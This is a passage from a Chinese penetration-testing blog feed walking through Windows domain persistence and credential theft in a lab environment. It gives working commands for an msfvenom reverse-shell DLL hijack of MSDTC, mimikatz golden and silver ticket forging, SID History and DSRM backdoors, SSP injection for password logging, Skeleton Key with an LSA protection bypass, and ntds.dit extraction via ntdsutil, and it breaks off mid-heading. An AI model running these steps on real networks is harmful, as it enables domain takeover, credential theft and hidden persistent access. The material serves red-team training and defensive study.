data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211020163536474.png" alt="image-20211020163536474"></p><p>注册表对应位置</p><pre><code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\MSDTC\MTxOCI</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211020163317466.png" alt="image-20211020163317466"></p><p>但是默认的windows里面是没有oci.dll，也就是说我们可以利用msf生成一个dll后门，当我们放在windows/system32下后就会自动执行</p><pre><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.100.128 LPORT=4444 -f dll &gt; oci.dll</code></pre><p>上传oci.dll</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211020164149991.png" alt="image-20211020164149991"></p><p>杀死原来的进程</p><pre><code>taskkill /f /im msdtc.exe //pid杀不掉，用im就能，im是指定进程名称</code></pre><p>重启</p><pre><code>net start msdtc</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211020165032902.png" alt="image-20211020165032902"></p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211020165041982.png" alt="image-20211020165041982"></p><p>成功拿到了shell</p><p>未完待续，还有很多的方法，先总结一部分</p><h1 id="域控制器权限维持"><a href="#域控制器权限维持" class="headerlink" title="域控制器权限维持"></a>域控制器权限维持</h1><p>说到域控权限的维持，第一个就想到了票据，既然有了票据，又重新回顾一下票据</p><h2 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h2><p>首先创建黄金票据的前提是得拿到域控，主要是为域控留下后门得。</p><p>因为在kerberos认证过程中，client发送消息给KDC请求连接，而KDC是用krbtgt用户的NTLM hash进行加密得到得TGT，假如我们知道krbtgt的hash那么就能随便的构造TGT，而拿到这个hash的前提就得拿到域控的权限，因为krbtgt是域控里面的用户。那么想象这么一个场景：当我们拿到域控权限的时候，同时又拿到了所有用户的hash值，但是不小心权限维持失败了，碰巧管理员没有修改krbtgt的密码，那么hash值也不会发生变化的，所以我们就可以构造TGT，从而实现权限的维持。</p><p>黄金票据的前提：</p><p>1.需要伪造的域管理员的用户名</p><p>2.完整的域名</p><p>3.域SID</p><p>4.krbtgt的hash值</p><p>复现：</p><p>域成员：win7  192.168.1.3<br>域名：lbw.com<br>账号：dayu</p><p>域控：win2008 192.168.100<br>域名：lbw.com<br>账号：administrator</p><p>首先，我们登上域控，然后执行如下命令抓取krbtgt用户的Hash值并获取域sid：</p><pre><code>privilege::debuglsadump::lsa /patch        // 专用于在域控制器上导出用户密码或hash</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211020173838552.png" alt="image-20211020173838552"></p><p>现在已经满足4个条件了，一个域SID和krbtgt的 NTLM hash  完整的域    域管理员的用户名</p><p>我们切换到普通域用户的机器Windows 7，用mimikatz生成名为ticket.kirbi的TGT凭证，用户名为administrator：</p><pre><code>kerberos::golden /user:需要伪造的域管理员用户名 /domain:demo.com /sid:域sid /krbtgt: krbtgt用户的Hash /ticket:ticket.kirbikerberos::golden</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211020174210964.png" alt="image-20211020174210964"></p><p>生成TGT凭证ticket.kirbi成功，名为ticket.kirbi，然后使用mimikatz将凭证ticket.kirbi注入进去,在win7下执行</p><pre><code>kerberos::ptt ticket.kirbikerberos::ptt &lt;票据文件&gt;</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211020174232107.png" alt="image-20211020174232107"></p><p>查看此前的票据</p><pre><code>kerberos::tgt</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211020174241982.png" alt="image-20211020174241982"></p><p>还想administrator已经被注入进去了，此时，攻击者就可以利用Windows 7可任意访问域控，可以使用net use进行登录（ipc$）</p><pre><code>net use \\目标IP\ipc$ "密码" /user:账号net use \\主机名  //也可以</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211020174322208.png" alt="image-20211020174322208"></p><p>或者直接dir \\计算机名\c$,还可以PsExec，wmi执行</p><h2 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h2><p>对于白银票据主要是对于服务起作用，因为它利用的是伪造TGS也就是票据授予中心，通过已知的授权服务密码生成一张可以访问该服务的TGT。票据在生成过程中不需要使用KDC，所以可以绕过域控制器，很少留下日志。而黄金票据在利用过程中由KDC颁发TGT，并且在生成伪造的TGT得20分钟内，TGS不会对该TGT的真伪进行校验。</p><p>白银票据依赖的是服务账号的密码hash值，而黄金票据是利用的krbtgt的hash值，更加隐蔽。但是伪造的门票只对部分服务起作用，如cifs，mssql,winrm(windows的远程管理)，DNS等等</p><p>前提条件：</p><ul><li>域名</li><li>域SID</li><li>目标服务器的FQDN(就是带有主机名和域名的名称)</li><li>可利用的服务</li><li>服务账号的NTLM hash</li><li>要伪造的用户名</li></ul><p>实验使用了白银票据伪造CIFS服务权限，CIFS用于windows主机之前的文件共享</p><p>复现：</p><p>在实验之前先清空票据</p><pre><code>kerberos::purge</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211020175233035.png" alt="image-20211020175233035"></p><pre><code>抓取域控机器名的ntlm哈希privilege::debugsekurlsa::logonpasswords</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211020175331002.png" alt="image-20211020175331002"></p><p>注意是主机名后面还有一个$</p><pre><code>kerberos::golden /domain:域名 /sid:填sid /target:完整的域控名 /service:cifs /rc4:服务账号NTMLHASH /user:用户名 /ptt/sid：域的SID值/rc4：server机器的hash/service：可利用的服务，这里是cifs/user：要伪造的用户名，任意填写/target：域控制器名，即FQDN（全称）</code></pre><p>只收集到了机器名，还有NTLMhash的值，还需要收集域SID和target及FQDN（就是主机名加域地址）</p><p>SID收集</p><pre><code>whoami /all  收集到了SID除去最后4位就是域SID</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211020175744629.png" alt="image-20211020175744629"></p><p>FQDN收集</p><pre><code>net time /domain</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211020175809130.png" alt="image-20211020175809130"></p><p>FQDN就是WIN-XXXXXXX.lbw.com</p><pre><code>kerberos::golden /domain:lbw.com /sid:S-1-5-21-608395291-1654713299-1638526874 /target:WIN-S08SN3AEOEO.lbw.com /service:cifs /rc4:effbf486f8e182e1515f32e8a9b5de97 /user:kk /ptt</code></pre><p>注入到mimikatz里面就可以了，然后在dir就可以访问了</p><pre><code>dir \\机器名全称（比如）owa.gog.org\c$   </code></pre><p>白银票据服务列表</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211020180126279.png" alt="image-20211020180126279"></p><p>总结：</p><p>黄金票据主要是拿到了域控，留后门方式，利用krbtgt的NTLM hash值来伪造TGT，针对所有的服务</p><p>白银票据针对的是windows上的服务，利用的是服务账号的hash来伪造TGS，并且是以一个普通用户的账号是伪造的，只对一个服务有效</p><h2 id="SID-history域后门"><a href="#SID-history域后门" class="headerlink" title="SID history域后门"></a>SID history域后门</h2><p><strong>SID History</strong>是在域迁移过程中需要使用的一个属性。</p><p>如果将A域中的域用户迁移到B域中，那么在B域中该用户的SID会随之改变，进而影响迁移后用户的权限，导致迁移后的用户不能访问本来可以访问的资源。SID History的作用是在域迁移过程中保持域用户的访问权限，即<strong>如果迁移后用户的SID改变了，系统会将其原来的SID添加到迁移后用户的SID History属性中，使迁移后的用户保持原有权限、能够访问其原来可以访问的资源</strong>。使用mimikatz，可以将SID History属性添加到域中任意用户的SID History属性中。在实战中，如果获得了域管理员权限，则可以将SID History作为实现持久化的方法。</p><p>环境我用的是红日靶场2</p><p>在做这个实验之前还需要在创建一个域用户</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211020181953300.png" alt="image-20211020181953300"></p><p>之后用shellcode_inject的方式启动mimikatz，并且还要把域管理员的sid添加到我们刚才创建的test用户里面</p><pre><code>privilege::debugsid::patch //修复NTDS服务，否则无法将高权限的SID注入低权限用户的SID History属性sid::add /sam:test /new:Administrator   //将Administrator的SID添加到test的SID History属性中</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211020182350601.png" alt="image-20211020182350601"></p><p>然后用powershell查看</p><pre><code>Import-Module activedirectory Get-ADUser test -Properties sidhistoryGet-ADUser administrator -Properties sidhistory</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211020182539247.png" alt="image-20211020182539247"></p><p>上面test，下面administrator</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211020182550751.png" alt="image-20211020182550751"></p><h2 id="DSRM域后门"><a href="#DSRM域后门" class="headerlink" title="DSRM域后门"></a>DSRM域后门</h2><blockquote><p>DSRM是Windows域环境中域控制器的安全模式启动选项。每一个域控都有一个本地管理员账号也就是DSRM账号</p><p>DSRM的用途是：允许管理员在域环境中出现故障或崩溃时还原、修复、重建活动目录数据库，使环境的运行恢复正常</p><p>在域环境创建初期，DSRM的密码需要在安装DC时设置，且很少会被重置。修改DSRM密码最基本的方法是在DC上运行ntdsutil命令行工具。</p><p>在渗透测试中，可以使用DSRM账号对域环境进行持久化操作。如果域控制器的系统版本为Windows Server 2008，需要安装KB961320才可以使用指定域账号的密码对DSRM的密码进行同步。在Windows Server 2008以后版木的系统中不需要安装此补丁。如果域控制器的系统版本为Windows Server 2003则不能使用该方法进行持久化操作。</p><p>每个域控制器都有本地管理员账号和密码(与域管理员账号和密码不同)。DSRM账号可以作为一个域控制器的本地管理用户，通过网络连接域控制器，进而控制域控制器</p></blockquote><h3 id="修改DSRM密码的方法"><a href="#修改DSRM密码的方法" class="headerlink" title="修改DSRM密码的方法"></a>修改DSRM密码的方法</h3><p>方法一</p><pre><code>ntdsutil    // 进入ntdsutilset dsrm password    // 设置DSRM账户的密码reset password on server null    // 在当前域控制器上恢复DSRM密码&lt;password&gt;    // 输入新密码&lt;password&gt;    // 重新输入新密码q    //退出DSRM密码设置模式q    // 退出ntdsutil</code></pre><p>还有一种方法是设置成了krbtgt的密码</p><pre><code>ntdsutilset dsrm passwordsync from domain account krbtgtqq</code></pre><h3 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h3><p>方法一主要是通过域主机加上域控，在更改域控的DSRM密码后，可通过域主机mimikatz用域控的本地管理员的hash传递攻击</p><h4 id="打开cmd输入ntdsutil"><a href="#打开cmd输入ntdsutil" class="headerlink" title="打开cmd输入ntdsutil"></a>打开cmd输入ntdsutil</h4><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211021114143858.png" alt="image-20211021114143858"></p><p>密码Password1234</p><h4 id="接着利用mimikatz读取本地管理员的NTLM-hash值"><a href="#接着利用mimikatz读取本地管理员的NTLM-hash值" class="headerlink" title="接着利用mimikatz读取本地管理员的NTLM hash值"></a>接着利用mimikatz读取本地管理员的NTLM hash值</h4><pre><code>privilege::debugtoken::elevate  //– 假冒令牌。 用于提升权限至SYSTEM 权限lsadump::sam</code></pre><p><img src="/images/loading.gif" data-original="C:%5CUsers%5C77960%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20211021114926808.png" alt="image-20211021114926808"></p><p>可以看到administrator的NTLM hash是8c3efc486704d2ee71eebe71af14d86c</p><h4 id="接着去修改目标主机DC的DSRM账户登录方式"><a href="#接着去修改目标主机DC的DSRM账户登录方式" class="headerlink" title="接着去修改目标主机DC的DSRM账户登录方式"></a>接着去修改目标主机DC的DSRM账户登录方式</h4><p>因为在windows server 2000之后的操作系统版本中，对于DSRM通过控制器登录域控做了限制，但是可以在注册表</p><pre><code>HKLM:\System\CurrentControlSet\Control\Lsa\中新建DsrmAdminLogonBehavior项进行设置</code></pre><p>其中有3个值可以设置</p><pre><code>1. 0:默认值，只有当域控制器重启并进入DSRM模式时，才可以使用DSRM管理员账号。2. 1: 只有当本地AD、DS服务停止时，才可以使用DSRM管理员账号登录域控制器。3. 2:在任何情况下，都可以使用DSRM管理员账号登录域控制器。</code></pre><p>所以我们的思路就是通过设置2来进行</p><pre><code>ps &gt; New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -name "DsrmAdminLogonBehavior" -value 2 -propertyType DWORD</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211021115742875.png" alt="image-20211021115742875"></p><p>之后我们就可以在域主机上通过mimikatz，使用域控制器的本地管理员哈希传递就可以了</p><pre><code>privilege::debugsekurlsa::pth /domain:OWA /user:Administrator /ntlm:8c3efc486704d2ee71eebe71af14d86c</code></pre><p>这里的domain是机器名不是域名</p><p>之后在win7的域主机上就会弹出cmd窗口，然后就可以远程操作</p><h3 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h3><p>还是一样步骤</p><pre><code>privilege::debuglsadump::lsa /patch /name:krbtgt</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211021135958553.png" alt="image-20211021135958553"></p><p>mimikatz查看并获取SAM文件中本地管理员的NTML</p><pre><code>token::elevatelsadump::sam</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211021140117858.png" alt="image-20211021140117858"></p><p>将DSRM账号和krbtgt的NTML HASH同步</p><pre><code>ntdsutilset dsrm passwordsync from domain account krbtgtqq</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211021143106064.png" alt="image-20211021143106064"></p><p>查看DSRM的NTML Hash是否同步成功</p><pre><code>lsadump::samlsadump::lsa /patch /name:krbtgt</code></pre><p>就会发现krbtgt和administrator的hash是一样的</p><h2 id="SSP维持域控制权限"><a href="#SSP维持域控制权限" class="headerlink" title="SSP维持域控制权限"></a>SSP维持域控制权限</h2><p>SSP（Security Support Provider）是Windows操作系统安全机制的提供者，之前在学习NTLM协议的时候就了解过了这一个SSP</p><p>重新回顾一下：</p><p>ssp是安全服务提供，而它之前有一个SSPI  是安全服务接口，定义了各种安全接口的函数，而SSP是实现这些函数的方式，因为SSPI只是定义，并没有功能去实现。</p><blockquote><p>可以说，SSPI是SSP的API接口。如果获得了网络中目标机器的系统，可以使用该方法进行持久权限化操作。其主要原理是：LSA（本地安全机构）用于验证身份；lsass.exe 是 Windows 的系统进程，用于本地安全和登录策略；在系统启动时，SSP 将被加载到 lsass.exe 进程中。但是，破坏攻击者 LSA 进行了扩展，自定义了恶意的  DLL文件，在系统启动时将其加载到LSASS.EXE进程中，就能够获取的Lsass.exe进程中的明文密码。这样，即使用户更改密码并重新登录，攻击者依然可以获取该账号的新密码</p></blockquote><h4 id="一-利用mimikatz伪造SSP内存注入"><a href="#一-利用mimikatz伪造SSP内存注入" class="headerlink" title="一.利用mimikatz伪造SSP内存注入"></a>一.利用mimikatz伪造SSP内存注入</h4><p>在注入后并不会留下文件，但是当用户重启后会丢失。</p><pre class="line-numbers language-asciiarmor"><code class="language-asciiarmor">privilege::debugmisc::memssp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211021144655753.png" alt="image-20211021144655753"></p><p>成功使用Mimikatz将伪造的SSP注入内存，只要用户在目标主机DC上重新登录（这里指的是注销、锁屏等重新登录，重启不行），登录的用户名和密码将会被记录在C:\Windows\System32\mimilsa.log 文件中。</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211021144909670.png" alt="image-20211021144909670"></p><p>附上大佬的锁屏ps脚本</p><pre class="line-numbers language-powershell"><code class="language-powershell"><span class="token keyword">Function</span> Lock<span class="token operator">-</span>WorkStation <span class="token punctuation">{</span><span class="token variable">$signature</span> = @<span class="token string">"[DllImport("</span>user32<span class="token punctuation">.</span>dll<span class="token string">", SetLastError = true)]public static extern bool LockWorkStation();"</span>@<span class="token variable">$LockWorkStation</span> = <span class="token function">Add-Type</span> <span class="token operator">-</span>memberDefinition <span class="token variable">$signature</span> <span class="token operator">-</span>name <span class="token string">"Win32LockWorkStation"</span> <span class="token operator">-</span>namespace Win32Functions <span class="token operator">-</span>passthru<span class="token variable">$LockWorkStation</span>::LockWorkStation<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span><span class="token punctuation">}</span>Lock<span class="token operator">-</span>WorkStation<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>只需要上传后执行</p><pre><code>powershell.exe 路径\xxx.ps1 或者.\xxx.ps1</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211021145150519.png" alt="image-20211021145150519"></p><h3 id="二-mimilib-dll"><a href="#二-mimilib-dll" class="headerlink" title="二.mimilib.dll"></a>二.mimilib.dll</h3><p>这种方法就是没有放进内存里面了，但是对于这种方法，持久化的效果比上一个好。主要是通过mimikatz把mimilib.dll放到system32里面去，然后添加注册表里面，即使重启也不会影响</p><p>上传mimilib.dll</p><p>修改注册表 HKEY_LOCAL_MACHINE/System/CurrentControlSet/Control/Lsa 的 Security Packages 项，将mimilib.dll添加进去，让其加载新的DLL文件“mimilib.dll”：</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211021160221295.png" alt="image-20211021160221295"></p><p>重启系统</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211021160529428.png" alt="image-20211021160529428"></p><h2 id="Skeleton-Key（万能钥匙）"><a href="#Skeleton-Key（万能钥匙）" class="headerlink" title="Skeleton Key（万能钥匙）"></a>Skeleton Key（万能钥匙）</h2><blockquote><p>skeleton key(万能钥匙)就是给所有域内用户添加一个相同的密码，域内所有的用户都可以使用这个密码进行认证，同时原始密码也可以使用，其原理就是对 lsass.exe 进行注入，所以重启后会失效</p></blockquote><p>在域控上执行</p><pre><code>privilege::debugmisc::skeleton</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211021161002096.png" alt="image-20211021161002096"></p><p>注入成功后就会在域所有的账号都添加了一个mimikatz密码，使用mimikatz密码登录就行了</p><p>但是微软在2014年3月12日添加了LSA保护策略，用来防止对进程lsass.exe的代码注入，所以需要绕过LSA protection</p><p><strong>配置LSA Protection</strong></p><p>注册表位置：</p><pre><code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa</code></pre><p>新建-<code>DWORD</code>值，名称为<code>RunAsPPL</code>,数值为<code>00000001</code></p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211021162018317.png" alt="image-20211021162018317"></p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211021162043545.png" alt="image-20211021162043545"></p><p>导入驱动文件mimidrv.sys</p><p>mimikatz执行</p><pre><code>privilege::debug!+!processprotect /process:lsass.exe /removemisc::skeleton</code></pre><p>密码还是mimikatz</p><p>未完待续。。。。</p><p>参考链接：</p><p><a href="https://whoamianony.top/2020/10/25/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%EF%BC%9A%E5%9F%9F%E5%86%85%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">https://whoamianony.top/2020/10/25/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%EF%BC%9A%E5%9F%9F%E5%86%85%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/</a></p><p><a href="https://cloud.tencent.com/developer/article/1813504" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1813504</a></p><p><a href="https://cloud.tencent.com/developer/article/1850726" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1850726</a></p><p><a href="https://www.cnblogs.com/Secde0/p/13938311.html" target="_blank" rel="noopener">https://www.cnblogs.com/Secde0/p/13938311.html</a></p><p><a href="https://www.cnblogs.com/-mo-/p/12449964.html" target="_blank" rel="noopener">https://www.cnblogs.com/-mo-/p/12449964.html</a></p><p><a href="https://www.freebuf.com/articles/web/284497.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/284497.html</a></p><p><a href="https://xz.aliyun.com/t/8095#toc-7" target="_blank" rel="noopener">https://xz.aliyun.com/t/8095#toc-7</a></p><p><a href="https://www.cnblogs.com/nanstar/p/13443346.html" target="_blank" rel="noopener">https://www.cnblogs.com/nanstar/p/13443346.html</a></p><p><a href="https://jingyan.baidu.com/article/eae07827b027af1fec5485a2.html" target="_blank" rel="noopener">https://jingyan.baidu.com/article/eae07827b027af1fec5485a2.html</a></p><p><a href="https://uknowsec.cn/posts/notes/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%9F%9F%E7%BB%B4%E6%9D%83.html" target="_blank" rel="noopener">https://uknowsec.cn/posts/notes/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%9F%9F%E7%BB%B4%E6%9D%83.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>域控安全</title>
      <link href="/posts/836f.html"/>
      <url>/posts/836f.html</url>
      
        <content type="html"><![CDATA[<h1 id="域控安全之ntds-dit导出"><a href="#域控安全之ntds-dit导出" class="headerlink" title="域控安全之ntds.dit导出"></a>域控安全之ntds.dit导出</h1><p>🐱‍🏍🐱‍🏍🐱‍🏍🐱‍🏍🐱‍🏍🐱‍🏍🐱‍🏍</p><p>在通常的情况下,即使我们拥有域管理员的权限也是无法读取域控制器的C:\Windows\NTDS\ntds.dit文件,是因为活动目录始终访问着这个文件,所以禁止读取.使用windows的本地卷影拷贝就可以获得文件的副本</p><p>什么是卷影拷贝：卷影拷贝服务（Volume Shadow Copy Service，VSS）是<a href="https://baike.baidu.com/item/Microsoft" target="_blank" rel="noopener">Microsoft</a>在Windows XP中开始引入的服务，但到了[Windows Server 2003](<a href="https://baike.baidu.com/item/Windows" target="_blank" rel="noopener">https://baike.baidu.com/item/Windows</a> Server 2003)作为一个备份服务器功能独立出来，它能让用户在没有IT专业人员协助的情况下，更轻松地恢复丢失的文件。</p><h2 id="Ntds-dit"><a href="#Ntds-dit" class="headerlink" title="Ntds.dit"></a>Ntds.dit</h2><p>什么是ntds.dit</p><blockquote><p>在活动目录中,所有的数据都保存在ntds.dit中,ntds.dit是一个二进制文件，存储位置为域控制器的%SystemRoot%\ntds\ntds.dit。ntds.dit中包含（但不限于）用户名、散列值、组、GPP、OU等与活动目录相关的信息。而在非域环境也就是在工作组环境中，用户的密码等信息存储在SAM文件，想要破解SAM文件与Ntds.dit文件都需要拥有一个System文件。它和sam一样，是被Windows操作系统锁定的</p></blockquote><p>如何利用:</p><blockquote><p>在一般的情况下,系统的运维人员会利用卷影拷贝服务实验这些操作. VSS本质上属于快照技术的一种,主要用于备份和恢复(即使目标处于锁定的状态)</p></blockquote><p>位置</p><pre><code>ntds.dit文件位置: `C:\Windows\NTDS\NTDS.dit` system文件位置:`C:\Windows\System32\config\SYSTEM` sam文件位置:`C:\Windows\System32\config\SAM` ntds.dit一般存储域用户的信息，sam是本机的，然后system里面存放了密钥，如果sam,ntds.dit要破解就需要system</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211017210302515.png" alt="image-20211017210302515"></p><h1 id="提取ntds-dit"><a href="#提取ntds-dit" class="headerlink" title="提取ntds.dit"></a>提取ntds.dit</h1><h2 id="通过ntdsutil-exe-提取-ntds-dit"><a href="#通过ntdsutil-exe-提取-ntds-dit" class="headerlink" title="通过ntdsutil.exe 提取 ntds.dit"></a>通过ntdsutil.exe 提取 ntds.dit</h2><p>ntdsutil.exe是一个位活动目录(AD)提供管理机制的命令行工具。该工具默认安装在了域控制器上面,可以在域控制器上面直接操作,也可以通过域内机器在域控制器上远程操作.</p><p>支持的系统：windows server 2003 ，windows server 2008， windows server 2012。</p><h3 id="1-创建一个快照"><a href="#1-创建一个快照" class="headerlink" title="1.创建一个快照"></a>1.创建一个快照</h3><pre><code>ntdsutil snapshot "activate instance ntds" create quit quit</code></pre><p>该快照包含Windows中的所有文件，且在复制时不会受到Windows锁定机制的影响，需要<strong><em>管理员权限</em></strong>去执行</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211015171201418.png" alt="image-20211015171201418"></p><p>可以看到这边创建了一个GUID{06a1b343-93f9-4c1b-a613-d02c23f99759}</p><h3 id="2-加载快照"><a href="#2-加载快照" class="headerlink" title="2.加载快照"></a>2.加载快照</h3><pre><code>ntdsutil snapshot "mount {06a1b343-93f9-4c1b-a613-d02c23f99759}" quit quit   //这个后面的就是刚创建的ID</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211015171607389.png" alt="image-20211015171607389"></p><p>可以看到快照已经加载到了</p><pre><code>路径： C:\$SNAP_202110151711_VOLUMEC$\</code></pre><p>查看一下</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211015171816728.png" alt="image-20211015171816728"></p><p>确实存在了</p><h3 id="3-拷贝快照"><a href="#3-拷贝快照" class="headerlink" title="3.拷贝快照"></a>3.拷贝快照</h3><pre><code>copy C:\$SNAP_202110151711_VOLUMEC$\windows\ntds\ntds.dit c:\windows\temp\ntds.dit</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211015172046097.png" alt="image-20211015172046097"></p><h3 id="4-卸载删除快照"><a href="#4-卸载删除快照" class="headerlink" title="4.卸载删除快照"></a>4.卸载删除快照</h3><pre><code>ntdsutil snapshot "unmount {06a1b343-93f9-4c1b-a613-d02c23f99759}" "delete {06a1b343-93f9-4c1b-a613-d02c23f99759}" quit quitntdsutil snapshot "mount &lt;ID&gt;" "delete &lt;ID&gt;" quit quit</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211015172756816.png" alt="image-20211015172756816"></p><h3 id="5-查看一下快照"><a href="#5-查看一下快照" class="headerlink" title="5.查看一下快照"></a>5.查看一下快照</h3><pre><code>ntdsutil snapshot "List All" quit quit</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211015173520407.png" alt="image-20211015173520407"></p><h2 id="使用-ntdsutil-的-IFM卷影拷贝提取Ntds-dit文件"><a href="#使用-ntdsutil-的-IFM卷影拷贝提取Ntds-dit文件" class="headerlink" title="使用 ntdsutil 的 IFM卷影拷贝提取Ntds.dit文件"></a>使用 ntdsutil 的 IFM卷影拷贝提取Ntds.dit文件</h2><p>通过上一个命令执行来实现创建快照，加载，拷贝，最后提去出来ntds.dit       同时也可以通过创建一个IFM，在使用ntdsutil创建IFM时，需要进行生成快照、加载、将{% label info@ntds.dit 和计算机的SAM文件复制到目标文件夹中等 %}操作</p><h3 id="1-执行创建IFM"><a href="#1-执行创建IFM" class="headerlink" title="1.执行创建IFM"></a>1.执行创建IFM</h3><p>在<strong>域控制器</strong>中执行如下命令即可（需要域管理员权限，没有的会让其弹出UAC）：</p><pre><code>ntdsutil "ac i ntds" "ifm" "create full c:/test" q q </code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211017192759465.png" alt="image-20211017192759465"></p><p>然后就会在c盘下的/test/Active Directory  会出现ntds.dit</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211017192909004.png" alt="image-20211017192909004"></p><p>同时test/registry也会出现system security文件</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211017193004852.png" alt="image-20211017193004852"></p><h3 id="2-移动ntds-dit文件"><a href="#2-移动ntds-dit文件" class="headerlink" title="2.移动ntds.dit文件"></a>2.移动ntds.dit文件</h3><pre><code>copy "c:\test\Active Directory\ntds.dit" c:\</code></pre><p><img src="/images/loading.gif" data-original="C:%5CUsers%5C77960%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20211017193606706.png" alt="image-20211017193606706"></p><h3 id="Copy-VSS-ps1"><a 